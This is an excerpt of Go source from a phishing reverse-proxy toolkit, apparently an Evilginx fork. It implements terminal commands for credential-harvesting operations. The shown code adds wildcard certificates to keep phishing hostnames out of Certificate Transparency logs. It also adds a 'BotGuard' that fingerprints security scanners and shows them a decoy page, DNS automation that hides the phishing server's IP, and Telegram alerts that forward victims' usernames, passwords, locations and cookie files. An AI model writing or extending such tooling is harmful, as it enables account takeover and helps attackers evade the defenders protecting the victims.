...
func (t *Terminal) handleConfig(args []string) error {
	...
	if pn == 0 {
		...
		wildcardOnOff := "off"
		if t.cfg.IsWildcardCertsEnabled() {
			wildcardOnOff = "on"
		}
		...
		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "wildcard", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot token", "telegram user id"}
		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, wildcardOnOff, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramUserID()}
		log.Printf("\n%s\n", AsRows(keys, vals))
		return nil
	} else if pn == 2 {
		switch args[0] {
		...
		case "wildcard":
			switch args[1] {
			case "on":
				if !t.crt_db.GetNameserver().IsExternalDNSEnabled() {
					log.Warning("wildcard certificates require external DNS to be configured")
					log.Info("configure external DNS first: dns provider <name>, dns api_key <key>, dns zone_id <id>, dns enable")
				}
				t.cfg.EnableWildcardCerts(true)
				return nil
			case "off":
				t.cfg.EnableWildcardCerts(false)
				return nil
			}
		case "gophish":
			switch args[1] {
...
func (t *Terminal) handleBotguard(args []string) error {
	...
	if pn == 0 {
		...
		if bg.IsEnabled() {
			...
			spoofURL := bg.GetSpoofURL()
			if spoofURL != "" {
				log.Info("Spoof URL: %s", spoofURL)
			}
		} else {
			log.Info("BotGuard: disabled")
		}
		stats := bg.GetStats()
		log.Info("Tracked IPs: %d", stats["tracked_ips"])
		log.Info("Trusted IPs: %d", stats["trusted_ips"])
		log.Info("Known bot JA4 signatures: %d", stats["known_bot_ja4"])
		log.Info("Known bot UA patterns: %d", stats["known_bot_ua"])
		return nil
	}
	...
	case "status":
		stats := bg.GetStats()
		log.Info("=== BotGuard Statistics ===")
		log.Info("Enabled: %v", stats["enabled"])
		log.Info("Spoof URL: %s", stats["spoof_url"])
		log.Info("Tracked IPs: %d", stats["tracked_ips"])
		log.Info("Trusted IPs: %d", stats["trusted_ips"])
		log.Info("Known bot JA4 signatures: %d", stats["known_bot_ja4"])
		log.Info("Known bot UA patterns: %d", stats["known_bot_ua"])
	...
	case "spoof":
		if pn < 2 {
			return fmt.Errorf("usage: botguard spoof <url>")
		}
		spoofURL := args[1]
		bg.Enable(spoofURL)
		log.Success("BotGuard enabled with spoof URL: %s", spoofURL)
		return nil
	case "trust":
		if pn < 2 {
			return fmt.Errorf("usage: botguard trust <ip>")
		}
		ip := args[1]
		bg.AddTrustedIP(ip)
		log.Success("Added %s to trusted IPs", ip)
		return nil
	case "add_ja4":
		if pn < 2 {
			return fmt.Errorf("usage: botguard add_ja4 <fingerprint>")
		}
		ja4 := args[1]
		bg.AddBotJA4(ja4)
		log.Success("Added JA4 fingerprint to known bot list: %s", ja4)
		return nil
	case "add_ua":
		if pn < 2 {
			return fmt.Errorf("usage: botguard add_ua <pattern>")
		}
		pattern := args[1]
		err := bg.AddBotUA(pattern)
		if err != nil {
			return fmt.Errorf("invalid regex pattern: %v", err)
		}
		log.Success("Added UA pattern to known bot list: %s", pattern)
		return nil
	}
...
func (t *Terminal) handleDNS(args []string) error {
	pn := len(args)
	dnsConfig := t.cfg.GetDNSConfig()
	ns := t.crt_db.GetNameserver()

	if pn == 0 {
		// Show DNS configuration
		var enabled string = "no"
		var autoSync string = "no"
		if dnsConfig.Enabled {
			enabled = "yes"
		}
		if dnsConfig.AutoSync {
			autoSync = "yes"
		}

		keys := []string{"enabled", "auto_sync", "provider", "api_key", "zone_id", "ttl"}
		apiKeyDisplay := ""
		if dnsConfig.ApiKey != "" {
			apiKeyDisplay = "********"
		}
		vals := []string{enabled, autoSync, dnsConfig.Provider, apiKeyDisplay, dnsConfig.ZoneID, strconv.Itoa(dnsConfig.TTL)}
		log.Printf("\n%s\n", AsRows(keys, vals))
		
		// Show external DNS status
		if ns.IsExternalDNSEnabled() {
			extDNS := ns.GetExternalDNS()
			log.Success("external DNS is active via %s", extDNS.GetProvider().GetName())
		} else if dnsConfig.Enabled {
			log.Warning("external DNS is enabled but provider is not fully configured")
		} else {
			log.Info("external DNS is disabled - using local DNS server on port %d", t.cfg.GetDnsPort())
		}
		return nil
	} else if pn == 1 {
		switch args[0] {
		case "enable":
			t.cfg.EnableDNS(true)
			ns.RefreshExternalDNS()
			log.Important("restart evilginx for external DNS changes to take full effect")
			return nil
		case "disable":
			t.cfg.EnableDNS(false)
			ns.RefreshExternalDNS()
			log.Important("restart evilginx to re-enable local DNS server")
			return nil
		case "sync":
			if !ns.IsExternalDNSEnabled() {
				return fmt.Errorf("external DNS is not enabled or configured")
			}
			hostnames := t.cfg.GetActiveHostnames("")
			if len(hostnames) == 0 {
				return fmt.Errorf("no active hostnames to sync (enable a phishlet first)")
			}
			log.Info("syncing %d hostnames with DNS provider...", len(hostnames))
			err := ns.SyncDNSRecords()
			if err != nil {
				return err
			}
			log.Success("DNS records synced successfully")
			return nil
		case "list":
			if !ns.IsExternalDNSEnabled() {
				return fmt.Errorf("external DNS is not enabled or configured")
			...
			extDNS := ns.GetExternalDNS()
			records, err := extDNS.ListRecords()
			if err != nil {
				return err
			}
			if len(records) == 0 {
			...
			log.Info("DNS A records:")
			for _, r := range records {
				log.Printf("  %s -> %s (TTL: %d)", r.Name, r.Content, r.TTL)
			}
			return nil
		}
	} else if pn == 2 {
		...
		case "auto_sync":
			switch args[1] {
			case "on":
				t.cfg.EnableDNSAutoSync(true)
				return nil
			case "off":
				t.cfg.EnableDNSAutoSync(false)
				return nil
			}
		case "add":
			if !ns.IsExternalDNSEnabled() {
		...
		case "delete":
			...
			extDNS := ns.GetExternalDNS()
			err := extDNS.RemoveRecord(args[1])
			if err != nil {
				return err
			}
			return nil
...
func (t *Terminal) handleEvilpuppet(args []string) error {
	pn := len(args)
	ep := t.p.GetEvilpuppet()
	
	if pn == 0 {
		// Show evilpuppet status
		var enabled string = "off"
		if ep != nil && ep.IsEnabled() {
			enabled = "on"
		}
		
		keys := []string{"status", "browser", "stealth_mode"}
		vals := []string{enabled, "chromium (go-rod)", "enabled"}
		log.Printf("\n%s\n", AsRows(keys, vals))
		
		if ep != nil && ep.IsEnabled() {
			log.Success("evilpuppet is active and ready for browser automation")
		} else {
			log.Info("evilpuppet is disabled - use 'evilpuppet on' to enable")
		}
		return nil
	} else if pn == 1 {
		switch args[0] {
		case "on", "enable":
			t.p.SetEvilpuppetEnabled(true)
			log.Success("evilpuppet enabled - browser automation active")
			return nil
		case "off", "disable":
			t.p.SetEvilpuppetEnabled(false)
			log.Info("evilpuppet disabled")
			return nil
		case "status":
			if ep != nil && ep.IsEnabled() {
				log.Success("evilpuppet is enabled and active")
			} else {
				log.Info("evilpuppet is disabled")
			}
			return nil
		}
	}
	return fmt.Errorf("invalid syntax: %s\nUsage: evilpuppet [on|off|status]", args)
}
...
func (t *Terminal) createHelp() {
	...
	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
			readline.PcItem("wildcard", readline.PcItem("on"), readline.PcItem("off")),
	...
	h.AddSubCommand("config", []string{"wildcard"}, "wildcard <on|off>", "enable wildcard TLS certificates (requires external DNS configured) - prevents hostname disclosure in CT logs")
	...
	h.AddCommand("botguard", "general", "manage bot detection and protection", "Configure BotGuard to detect and block automated requests from security scanners, bots, and crawlers.", LAYER_TOP,
		readline.PcItem("botguard",
			readline.PcItem("enable"),
			readline.PcItem("disable"),
			readline.PcItem("status"),
			readline.PcItem("spoof"),
			readline.PcItem("trust"),
			readline.PcItem("add_ja4"),
			readline.PcItem("add_ua")))

	h.AddSubCommand("botguard", nil, "", "show current botguard status")
	h.AddSubCommand("botguard", []string{"enable"}, "enable", "enable bot detection and protection")
	h.AddSubCommand("botguard", []string{"disable"}, "disable", "disable bot detection")
	h.AddSubCommand("botguard", []string{"status"}, "status", "show detailed botguard statistics")
	h.AddSubCommand("botguard", []string{"spoof"}, "spoof <url>", "set URL to display when bot is detected (e.g., https://example.com)")
	h.AddSubCommand("botguard", []string{"trust"}, "trust <ip>", "add an IP address to trusted list (won't be checked)")
	h.AddSubCommand("botguard", []string{"add_ja4"}, "add_ja4 <fingerprint>", "add a JA4 TLS fingerprint to known bot list")
	h.AddSubCommand("botguard", []string{"add_ua"}, "add_ua <pattern>", "add a user-agent regex pattern to known bot list")

	h.AddCommand("dns", "general", "manage external DNS provider configuration", "Configure external DNS providers (Cloudflare, DigitalOcean, Route53) to manage DNS records automatically. This allows you to separate your nameserver from your phishing server IP.", LAYER_TOP,
		readline.PcItem("dns",
			readline.PcItem("provider", readline.PcItem("cloudflare"), readline.PcItem("digitalocean"), readline.PcItem("route53")),
			readline.PcItem("api_key"),
			readline.PcItem("api_secret"),
			...
			readline.PcItem("auto_sync", readline.PcItem("on"), readline.PcItem("off")),
			readline.PcItem("add"),
			readline.PcItem("delete")))

	h.AddSubCommand("dns", nil, "", "show current DNS provider configuration")
	h.AddSubCommand("dns", []string{"provider"}, "provider <cloudflare|digitalocean|route53>", "set the DNS provider to use")
	h.AddSubCommand("dns", []string{"api_key"}, "api_key <key>", "set the API key for the DNS provider")
	h.AddSubCommand("dns", []string{"api_secret"}, "api_secret <secret>", "set the API secret (used by some providers like Route53)")
	h.AddSubCommand("dns", []string{"zone_id"}, "zone_id <id>", "set the zone ID for the domain")
	h.AddSubCommand("dns", []string{"ttl"}, "ttl <seconds>", "set the TTL for DNS records (default: 120)")
	h.AddSubCommand("dns", []string{"enable"}, "enable", "enable external DNS management")
	h.AddSubCommand("dns", []string{"disable"}, "disable", "disable external DNS management and use local DNS server")
	h.AddSubCommand("dns", []string{"sync"}, "sync", "sync all active phishlet hostnames to DNS provider")
	h.AddSubCommand("dns", []string{"list"}, "list", "list all A records at DNS provider")
	h.AddSubCommand("dns", []string{"auto_sync"}, "auto_sync <on|off>", "automatically sync DNS records when phishlets are enabled")
	h.AddSubCommand("dns", []string{"add"}, "add <hostname>", "manually add a hostname to DNS")
	h.AddSubCommand("dns", []string{"delete"}, "delete <hostname>", "manually remove a hostname from DNS")
...
func (t *Terminal) manageCertificates(verbose bool) {
	if !t.p.developer {
		if t.cfg.IsAutocertEnabled() {
			// Check if wildcard certificates are enabled
			if t.cfg.IsWildcardCertsEnabled() {
				// Use wildcard certificates via DNS-01 challenge
				hosts := t.p.cfg.GetWildcardHostnames()
				if len(hosts) == 0 {
					if verbose {
						log.Warning("no phishlets enabled, skipping wildcard certificate setup")
					}
					return
				}
				if verbose {
					log.Info("obtaining wildcard TLS certificates via DNS-01 challenge...")
					log.Info("this prevents hostname disclosure in Certificate Transparency logs")
					log.Info("certificates: %v", hosts)
				}
				err := t.p.crt_db.setManagedSyncWildcard(hosts, 120*time.Second)
				if err != nil {
					log.Error("failed to set up wildcard TLS certificates: %s", err)
					log.Error("make sure external DNS is properly configured")
					log.Error("run 'test-certs' command to retry")
					return
				}
				if verbose {
					log.Success("wildcard TLS certificates obtained successfully")
					log.Info("phishing hostnames are NOT exposed in CT logs")
				}
			} else {
				// Use regular certificates via HTTP-01 challenge
				hosts := t.p.cfg.GetActiveHostnames("")
				if len(hosts) == 0 {
					if verbose {
						log.Warning("no phishlets enabled, skipping certificate setup")
					}
					return
				}
				if verbose {
					log.Info("obtaining and setting up %d TLS certificates - please wait up to 60 seconds...", len(hosts))
					log.Warning("NOTE: hostnames will be visible in Certificate Transparency logs")
					log.Info("enable 'config wildcard on' with external DNS for privacy")
				}
...
func (t *Terminal) handleCheckTelegram(args []string) error {
	...
	notifier := NewTelegramNotifier(botToken, userID)
	err := notifier.TestConnection()
	if err != nil {
		log.Error("Telegram test failed: %v", err)
		return err
	}
	
	log.Success("Telegram configuration is complete and working!")
	log.Info("You will receive credential notifications with:")
	log.Info("  - Username & Password")
	log.Info("  - IP Address & Geolocation")
	log.Info("  - User Agent & Landing URL")
	log.Info("  - Timestamp")
	log.Info("  - Cookies file attachment")
	return nil
}
